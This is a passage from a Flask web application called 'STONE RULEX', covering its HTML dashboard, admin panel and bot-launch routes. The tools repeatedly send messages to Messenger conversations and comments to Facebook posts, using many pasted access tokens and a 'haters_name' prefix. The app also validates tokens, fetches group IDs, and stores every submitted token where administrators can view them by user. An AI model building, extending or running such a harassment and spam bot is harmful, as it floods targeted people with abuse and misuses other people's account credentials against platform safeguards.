            margin-bottom: 15px;
        }
        
        .result-valid { border-left: 6px solid #28a745; background: #d4edda; }
        .result-invalid { border-left: 6px solid #dc3545; background: #f8d7da; }
        
        .loading { text-align: center; padding: 30px; color: #6c757d; }
        
        .home-button {
            position: fixed;
            top: 20px;
            left: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 20px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            z-index: 1000;
            display: none;
        }
        
        .home-button.show { display: block; }
        
        @media (max-width: 768px) {
            .tool-sections { grid-template-columns: 1fr; }
            .task-header { flex-direction: column; align-items: flex-start; gap: 10px; }
            .task-buttons { width: 100%; }
            .user-info { position: static; justify-content: center; margin-top: 20px; }
        }
    </style>
</head>
<body>
    <button class="home-button" onclick="showAllTools()">
        <i class="fas fa-home"></i> Home
    </button>
    
    <div class="container">
        <div class="header">
            <h1>STONE RULEX</h1>
            <div class="user-info">
                <span class="user-username">{{ session.user_username }}</span>
                {% if session.is_admin %}
                <a href="/admin" class="btn-admin">
                    <i class="fas fa-cog"></i> 
                </a>
                {% endif %}
                <a href="/logout" class="btn-logout">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
        <div class="tool-sections">
            <!-- CONVO TOOL Section -->
            <div class="tool-section" id="convo-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="Convo Tool" class="tool-image">
                <button class="tool-button" onclick="toggleTool('convo-tool')">
                    <i class="fas fa-comments"></i> CONVO TOOL
                </button>
                
                <div id="convo-tool" class="tool-content">
                    <form action="/run_bot" method="post" enctype="multipart/form-data">
                        <div class="form-group">
                            <label><i class="fas fa-comments"></i> Conversation UID</label>
                            <input type="text" name="convo_uid" placeholder="Enter conversation UID" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-key"></i> Access Tokens (one per line)</label>
                            <textarea name="token" placeholder="Enter access tokens, one per line" required></textarea>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-file-alt"></i> Message File</label>
                            <input type="file" name="message_file" accept=".txt" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-clock"></i> Speed (seconds between messages)</label>
                            <input type="number" name="speed" min="1" max="300" value="5" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-tag"></i> Prefix Name</label>
                            <input type="text" name="haters_name" placeholder="Name to prefix messages with" required>
                        </div>
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-rocket"></i> Start New Task
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- FACEBOOK POST TOOL Section -->
            <div class="tool-section" id="facebook-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="Facebook Post Tool" class="tool-image">
                <button class="tool-button" onclick="toggleTool('facebook-post-tool')">
                    <i class="fab fa-facebook"></i> FACEBOOK POST TOOL
                </button>
                
                <div id="facebook-post-tool" class="tool-content">
                    <form action="/run_comment_bot" method="post" enctype="multipart/form-data">
                        <div class="form-group">
                            <label><i class="fab fa-facebook"></i> Post ID</label>
                            <input type="text" name="post_id" placeholder="Enter Facebook post ID" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-key"></i> Access Tokens (one per line)</label>
                            <textarea name="token" placeholder="Enter access tokens, one per line" required></textarea>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-file-alt"></i> Comment File</label>
                            <input type="file" name="comment_file" accept=".txt" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-clock"></i> Speed (seconds between comments)</label>
                            <input type="number" name="speed" min="1" max="300" value="5" required>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-tag"></i> Prefix Name</label>
                            <input type="text" name="haters_name" placeholder="Name to prefix comments with" required>
                        </div>
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-rocket"></i> Start Comment Bot
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- TOKEN CHECK Section -->
            <div class="tool-section" id="token-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="Token Check" class="tool-image">
                <button class="tool-button token-check" onclick="toggleTool('token-check')">
                    <i class="fas fa-key"></i> TOKEN CHECK
                </button>
                
                <div id="token-check" class="tool-content">
                    <div class="form-group">
                        <label><i class="fas fa-key"></i> Tokens to Check (one per line)</label>
                        <textarea id="check_tokens" placeholder="Enter tokens to validate, one per line"></textarea>
                    </div>
                    <button onclick="checkTokens()" class="btn btn-success">
                        <i class="fas fa-check-circle"></i> Check Tokens
                    </button>
                    <div id="token-results" class="result-container"></div>
                </div>
            </div>
            
            <!-- UID FETCHER Section -->
            <div class="tool-section" id="uid-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="UID Fetcher" class="tool-image">
                <button class="tool-button uid-fetcher" onclick="toggleTool('uid-fetcher')">
                    <i class="fas fa-search"></i> UID FETCHER
                </button>
                
                <div id="uid-fetcher" class="tool-content">
                    <div class="form-group">
                        <label><i class="fas fa-key"></i> Access Token</label>
                        <input type="text" id="groups_token" placeholder="Enter your access token">
                    </div>
                    <button onclick="fetchGroups()" class="btn btn-warning">
                        <i class="fas fa-download"></i> Fetch Messenger Groups
                    </button>
                    <div id="groups-results" class="result-container"></div>
                </div>
            </div>
            
            <!-- TASK MANAGER Section -->
            <div class="tool-section" id="manager-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="Task Manager" class="tool-image">
                <button class="tool-button" onclick="toggleTool('task-manager')">
                    <i class="fas fa-tasks"></i> TASK MANAGER
                </button>
                
                <div id="task-manager" class="tool-content">
                    <button onclick="refreshTasks()" class="btn btn-primary">
                        <i class="fas fa-sync"></i> Refresh Tasks
                    </button>
                    <div id="tasks-container" class="result-container">
                        <div class="loading">Click refresh to load tasks</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function toggleTool(toolId) {
            // Hide all tool sections except the one being opened
            const allSections = document.querySelectorAll('.tool-section');
            const allContents = document.querySelectorAll('.tool-content');
            const homeButton = document.querySelector('.home-button');
            
            // Close all tool contents first
            allContents.forEach(content => content.classList.remove('active'));
            
            // Hide all sections except the one containing the clicked tool
            const targetContent = document.getElementById(toolId);
            const targetSection = targetContent.closest('.tool-section');
            
            allSections.forEach(section => {
                if (section !== targetSection) {
                    section.style.display = 'none';
                }
            });
            
            // Show the target tool content
            targetContent.classList.add('active');
            
            // Show home button
            homeButton.classList.add('show');
            
            // Auto-refresh tasks if task manager is opened
            if (toolId === 'task-manager') {
                refreshTasks();
            }
        }
        
        function showAllTools() {
            // Show all tool sections
            const allSections = document.querySelectorAll('.tool-section');
            const allContents = document.querySelectorAll('.tool-content');
            const homeButton = document.querySelector('.home-button');
            
            allSections.forEach(section => {
                section.style.display = 'block';
            });
            
            // Close all tool contents
            allContents.forEach(content => content.classList.remove('active'));
            
            // Hide home button
            homeButton.classList.remove('show');
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n').filter(t => t.trim());
            const resultsContainer = document.getElementById('token-results');
            
            if (tokens.length === 0) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter at least one token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'result-item result-valid' : 'result-item result-invalid';
                    
                    let content = `<strong>Token:</strong> ${result.token.substring(0, 20)}...<br>`;
                    content += `<strong>Status:</strong> ${result.message}<br>`;
                    
                    if (result.valid && result.name) {
                        content += `<strong>Name:</strong> ${result.name}<br>`;
                    }
                    
                    div.innerHTML = content;
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('groups_token').value.trim();
            const resultsContainer = document.getElementById('groups-results');
            
            if (!token) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter a valid token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Fetching messenger groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    if (data.groups.length === 0) {
                        resultsContainer.innerHTML = '<div class="result-item result-invalid">No groups found</div>';
                        return;
                    }
                    
                    const div = document.createElement('div');
                    div.className = 'result-item result-valid';
                    div.innerHTML = `<h4>Found ${data.groups.length} Messenger Groups:</h4>`;
                    
                    data.groups.forEach(group => {
                        const groupDiv = document.createElement('div');
                        groupDiv.style.cssText = 'margin: 10px 0; padding: 10px; background: #f8f9fa; border-radius: 5px;';
                        groupDiv.innerHTML = `<strong>${group.name}</strong><br><small>UID: ${group.uid}</small>`;
                        div.appendChild(groupDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    resultsContainer.innerHTML = `<div class="result-item result-invalid"><strong>Error:</strong> ${data.message}</div>`;
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error fetching groups</div>';
            });
        }
        
        function fetchGroupMembers() {
            const token = document.getElementById('group_members_token').value.trim();
            const groupUid = document.getElementById('group_members_uid').value.trim();
            const resultsContainer = document.getElementById('group-members-results');
            
            if (!token || !groupUid) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter both token and group UID</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Fetching group members...</div>';
            
            fetch('/fetch_group_members', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({token: token, group_uid: groupUid}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    if (data.members.length === 0) {
                        resultsContainer.innerHTML = '<div class="result-item result-invalid">No members found</div>';
                        return;
                    }
                    
                    const div = document.createElement('div');
                    div.className = 'result-item result-valid';
                    div.innerHTML = `<h4>${data.group_name} - ${data.members.length} Members:</h4>`;
                    
                    data.members.forEach(member => {
                        const memberDiv = document.createElement('div');
                        memberDiv.style.cssText = 'margin: 10px 0; padding: 10px; background: #f8f9fa; border-radius: 5px;';
                        memberDiv.innerHTML = `<strong>${member.name}</strong><br><small>ID: ${member.id}</small>`;
                        div.appendChild(memberDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    resultsContainer.innerHTML = `<div class="result-item result-invalid"><strong>Error:</strong> ${data.message}</div>`;
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error fetching group members</div>';
            });
        }
        
        function refreshTasks() {
            fetch('/get_user_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksContainer = document.getElementById('tasks-container');
                tasksContainer.innerHTML = '';
                
                if (data.tasks.length === 0) {
                    tasksContainer.innerHTML = '<div class="loading">No active tasks found</div>';
                    return;
                }
                
                data.tasks.forEach(task => {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-id">Task: ${task.id} (${task.task_type.toUpperCase()})</div>
                            <div class="task-status status-${task.status}">${task.status}</div>
                        </div>
                        <div class="task-info">
                            <div class="task-info-item">
                                <div class="task-info-label">${task.task_type === 'facebook_post' ? 'Post ID' : 'Conversation'}</div>
                                <div class="task-info-value">${task.convo_uid}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Prefix</div>
                                <div class="task-info-value">${task.haters_name}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Started</div>
                                <div class="task-info-value">${task.started_at}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Token</div>
                                <div class="task-info-value">${task.token_name}</div>
                            </div>
                        </div>
                        <div class="task-buttons">
                            ${task.status === 'running' ? 
                                `<button onclick="stopTask('${task.id}')" class="btn btn-danger">
                                    <i class="fas fa-stop"></i> Stop Task
                                </button>` : 
                                `<button onclick="removeTask('${task.id}')" class="btn btn-danger">
                                    <i class="fas fa-trash"></i> Remove Task
                                </button>`
                            }
                            <button onclick="refreshTaskLogs('${task.id}')" class="btn btn-primary">
                                <i class="fas fa-sync"></i> Refresh Logs
                            </button>
                        </div>
                        <div class="log-container" id="log-${task.id}">
                            <div class="log-entry">Loading logs...</div>
                        </div>
                    `;
                    tasksContainer.appendChild(taskDiv);
                    
                    // Load logs for this task
                    refreshTaskLogs(task.id);
                });
            })
            .catch(error => {
                document.getElementById('tasks-container').innerHTML = '<div class="loading">Error loading tasks</div>';
            });
        }
        
        function refreshTaskLogs(taskId) {
            fetch(`/get_task_logs/${taskId}`)
            .then(response => response.json())
            .then(data => {
                const logContainer = document.getElementById(`log-${taskId}`);
                if (logContainer) {
                    logContainer.innerHTML = '';
                    if (data.logs.length === 0) {
                        logContainer.innerHTML = '<div class="log-entry">No logs available</div>';
                    } else {
                        data.logs.forEach(log => {
                            const logEntry = document.createElement('div');
                            logEntry.className = 'log-entry';
                            logEntry.textContent = log;
                            logContainer.appendChild(logEntry);
                        });
                        logContainer.scrollTop = logContainer.scrollHeight;
                    }
                }
            })
            .catch(error => {
                console.error('Error refreshing logs:', error);
            });
        }
        
        function stopTask(taskId) {
            if (confirm('Are you sure you want to stop this task?')) {
                fetch(`/stop_task/${taskId}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        setTimeout(() => refreshTasks(), 1000);
                    } else {
                        alert('Error stopping task: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Error stopping task');
                });
            }
        }
        
        function removeTask(taskId) {
            if (confirm('Are you sure you want to remove this task?')) {
                fetch(`/remove_task/${taskId}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshTasks();
                    } else {
                        alert('Error removing task: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Error removing task');
                });
            }
        }
        
        // Auto-refresh task logs every 5 seconds
        setInterval(() => {
            const taskManager = document.getElementById('task-manager');
            if (taskManager && taskManager.classList.contains('active')) {
                const taskContainers = document.querySelectorAll('[id^="log-"]');
                taskContainers.forEach(container => {
                    const taskId = container.id.replace('log-', '');
                    refreshTaskLogs(taskId);
                });
            }
        }, 5000);
    </script>
</body>
</html>
'''

# Admin panel HTML
admin_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            max-width: 1400px;
            margin: 0 auto;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header h1 { font-size: 3rem; margin-bottom: 15px; font-weight: 900; }
        .header p { font-size: 1.2rem; opacity: 0.95; font-weight: 500; }
        
        .nav-buttons {
            position: absolute;
            top: 25px;
            right: 25px;
            display: flex;
            gap: 15px;
        }
        
        .btn-nav {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            cursor: pointer;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
        }
        
        .admin-sections {
            display: grid;
            grid-template-columns: 1fr;
            gap: 40px;
            padding: 40px;
        }
        
        .admin-section {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .section-title {
            font-size: 1.8rem;
            color: #495057;
            margin-bottom: 25px;
            font-weight: 800;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            margin: 5px;
        }
        
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn-success { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; }
        .btn-danger { background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%); color: white; }
        
        .user-item, .token-group {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
        }
        
        .user-header, .token-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .user-name, .token-username {
            font-weight: 800;
            color: #667eea;
            font-size: 1.3rem;
        }
        
        .user-status {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
        }
        
        .status-pending { background: #ffc107; color: #212529; }
        .status-approved { background: #28a745; color: white; }
        .status-admin { background: #6f42c1; color: white; }
        
        .user-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .user-info-item {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .user-info-label {
            font-size: 12px;
            color: #6c757d;
            text-transform: uppercase;
            margin-bottom: 5px;
            font-weight: 700;
        }
        
        .user-info-value { font-weight: 700; color: #495057; }
        
        .user-actions { display: flex; gap: 10px; flex-wrap: wrap; }
        
        .token-item {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            border-left: 4px solid #667eea;
        }
        
        .token-info {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1fr;
            gap: 15px;
            align-items: center;
        }
        
        .token-value {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: #f8f9fa;
            padding: 8px;
            border-radius: 4px;
            word-break: break-all;
        }
        
        .token-status {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
        }
        
        .token-valid { background: #d4edda; color: #155724; }
        .token-invalid { background: #f8d7da; color: #721c24; }
        
        .loading { text-align: center; padding: 30px; color: #6c757d; }
        
        @media (max-width: 768px) {
            .user-header, .token-header { flex-direction: column; align-items: flex-start; gap: 10px; }
            .token-info { grid-template-columns: 1fr; }
            .nav-buttons { position: static; justify-content: center; margin-top: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> ADMIN PANEL</h1>
            <p>User Management & Token Overview</p>
            <div class="nav-buttons">
                <a href="/" class="btn-nav">
                    <i class="fas fa-home"></i> Dashboard
                </a>
                <a href="/logout" class="btn-nav">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
        <div class="admin-sections">
            <!-- User Management Section -->
            <div class="admin-section">
                <h2 class="section-title">
                    <i class="fas fa-users"></i> User Management
                </h2>
                <button onclick="refreshUsers()" class="btn btn-primary">
                    <i class="fas fa-sync"></i> Refresh Users
                </button>
                <div id="users-container">
                    <div class="loading">Click refresh to load users</div>
                </div>
            </div>
            
            <!-- Token Overview Section -->
            <div class="admin-section">
                <h2 class="section-title">
                    <i class="fas fa-key"></i> Token Overview
                </h2>
                <button onclick="refreshTokens()" class="btn btn-primary">
                    <i class="fas fa-sync"></i> Refresh Tokens
                </button>
                <div id="tokens-container">
                    <div class="loading">Click refresh to load tokens</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function refreshUsers() {
            fetch('/admin/get_users')
            .then(response => response.json())
            .then(data => {
                const usersContainer = document.getElementById('users-container');
                usersContainer.innerHTML = '';
                
                if (data.users.length === 0) {
                    usersContainer.innerHTML = '<div class="loading">No users found</div>';
                    return;
                }
                
                data.users.forEach(user => {
                    const userDiv = document.createElement('div');
                    userDiv.className = 'user-item';
                    
                    let statusClass = 'status-pending';
                    let statusText = 'Pending';
                    
                    if (user.admin) {
                        statusClass = 'status-admin';
                        statusText = 'Admin';
                    } else if (user.approved) {
                        statusClass = 'status-approved';
                        statusText = 'Approved';
                    }
                    
                    userDiv.innerHTML = `
                        <div class="user-header">
                            <div class="user-name">${user.username}</div>
                            <div class="user-status ${statusClass}">${statusText}</div>
                        </div>
                        <div class="user-info">
                            <div class="user-info-item">
                                <div class="user-info-label">User ID</div>
                                <div class="user-info-value">${user.id}</div>
                            </div>
                            <div class="user-info-item">
                                <div class="user-info-label">Created</div>
                                <div class="user-info-value">${user.created_at}</div>
                            </div>
                            <div class="user-info-item">
                                <div class="user-info-label">Admin</div>
                                <div class="user-info-value">${user.admin ? 'Yes' : 'No'}</div>
                            </div>
                            <div class="user-info-item">
                                <div class="user-info-label">Approved</div>
                                <div class="user-info-value">${user.approved ? 'Yes' : 'No'}</div>
                            </div>
                        </div>
                        <div class="user-actions">
                            ${!user.approved && !user.admin ? 
                                `<button onclick="approveUser(${user.id})" class="btn btn-success">
                                    <i class="fas fa-check"></i> Approve User
                                </button>` : ''
                            }
                            ${!user.admin ? 
                                `<button onclick="deleteUser(${user.id})" class="btn btn-danger">
                                    <i class="fas fa-trash"></i> Delete User
                                </button>` : ''
                            }
                        </div>
                    `;
                    usersContainer.appendChild(userDiv);
                });
            })
            .catch(error => {
                document.getElementById('users-container').innerHTML = '<div class="loading">Error loading users</div>';
            });
        }
        
        function refreshTokens() {
            fetch('/admin/get_tokens')
            .then(response => response.json())
            .then(data => {
                const tokensContainer = document.getElementById('tokens-container');
                tokensContainer.innerHTML = '';
                
                if (Object.keys(data.tokens).length === 0) {
                    tokensContainer.innerHTML = '<div class="loading">No tokens found</div>';
                    return;
                }
                
                Object.entries(data.tokens).forEach(([username, tokens]) => {
                    const tokenGroupDiv = document.createElement('div');
                    tokenGroupDiv.className = 'token-group';
                    
                    let tokensHtml = '';
                    tokens.forEach(token => {
                        const statusClass = token.is_valid ? 'token-valid' : 'token-invalid';
                        const statusText = token.is_valid ? 'Valid' : 'Invalid';
                        
                        tokensHtml += `
                            <div class="token-item">
                                <div class="token-info">
                                    <div>
                                        <strong>Token:</strong>
                                        <div class="token-value">${token.token_value.substring(0, 50)}...</div>
                                    </div>
                                    <div>
                                        <strong>Name:</strong><br>
                                        ${token.token_name}
                                    </div>
                                    <div>
                                        <strong>Status:</strong><br>
                                        <span class="token-status ${statusClass}">${statusText}</span>
                                    </div>
                                    <div>
                                        <strong>Added:</strong><br>
                                        ${token.created_at}
                                    </div>
                                </div>
                            </div>
                        `;
                    });
                    
                    tokenGroupDiv.innerHTML = `
                        <div class="token-header">
                            <div class="token-username">${username}</div>
                            <div style="color: #6c757d; font-size: 14px;">${tokens.length} token(s)</div>
                        </div>
                        ${tokensHtml}
                    `;
                    tokensContainer.appendChild(tokenGroupDiv);
                });
            })
            .catch(error => {
                document.getElementById('tokens-container').innerHTML = '<div class="loading">Error loading tokens</div>';
            });
        }
        
        function approveUser(userId) {
            if (confirm('Are you sure you want to approve this user?')) {
                fetch(`/admin/approve_user/${userId}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshUsers();
                    } else {
                        alert('Error approving user: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Error approving user');
                });
            }
        }
        
        function deleteUser(userId) {
            if (confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
                fetch(`/admin/delete_user/${userId}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshUsers();
                    } else {
                        alert('Error deleting user: ' + data.message);
                    }
                })
                .catch(error => {
                    alert('Error deleting user');
                });
            }
        }
        
        // Auto-load data on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshUsers();
            refreshTokens();
        });
    </script>
</body>
</html>
'''

# Authentication routes
@app.route('/')
def index():
    if 'user_id' not in session:
        return render_template_string(auth_html)
    return render_template_string(html_content)

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get("username")
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    
    if password != confirm_password:
        flash("Passwords do not match", "error")
        return render_template_string(auth_html)
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    try:
        c.execute("INSERT INTO users (username, password, approved) VALUES (?, ?, 0)", (username, hashed_password))
        conn.commit()
        flash("Registration successful! Your account is pending admin approval.", "success")
        return render_template_string(auth_html)
    except sqlite3.IntegrityError:
        flash("Username already exists", "error")
        return render_template_string(auth_html)
    finally:
        conn.close()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ?", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid username or password", "error")
        return render_template_string(auth_html)

@app.route('/admin_login', methods=['POST'])
def admin_login():
    username = request.form.get("username")
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ? AND admin = 1", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid admin credentials", "admin_error")
        return render_template_string(auth_html)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# Enhanced API routes for task management
@app.route('/get_user_tasks')
@approved_required
def get_user_tasks_api():
    user_id = session.get('user_id')
    tasks = get_user_tasks(user_id)
    return jsonify({'tasks': tasks})

@app.route('/get_task_logs/<task_id>')
@approved_required
def get_task_logs_api(task_id):
    user_id = session.get('user_id')
    
    # Verify task belongs to user
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM tasks WHERE id = ?", (task_id,))
    task = c.fetchone()
    conn.close()
    
    if not task or task[0] != user_id:
        return jsonify({'logs': []})
    
    logs = get_task_logs(task_id)
    return jsonify({'logs': logs})

@app.route('/run_bot', methods=['POST'])
@approved_required
def run_bot():
    global message_threads, stop_flags

    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']
    user_id = session.get('user_id')

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Save tokens for this user
    for token_line in token.splitlines():
        if token_line.strip():
            token_user_name = get_token_name(token_line.strip())
            save_user_token(user_id, token_line.strip(), token_user_name, True)
    
    # Create task record in database
    create_task_record(task_id, user_id, convo_uid, haters_name, token_name, 'convo')
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': user_id,
        'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"🚀 Bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
    return redirect(url_for('index'))

@app.route('/run_comment_bot', methods=['POST'])
@approved_required
def run_comment_bot():
    global message_threads, stop_flags

    post_id = request.form['post_id']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']
    user_id = session.get('user_id')

    comment_file = request.files['comment_file']
    comment_content = comment_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Save tokens for this user
    for token_line in token.splitlines():
        if token_line.strip():
            token_user_name = get_token_name(token_line.strip())
            save_user_token(user_id, token_line.strip(), token_user_name, True)
    
    # Create task record in database
    create_task_record(task_id, user_id, post_id, haters_name, token_name, 'facebook_post', post_id)
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': user_id,
        'thread': threading.Thread(target=send_comments, args=(task_id, post_id, token, comment_content, speed, haters_name)),
        'post_id': post_id,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"🚀 Facebook post commenting bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
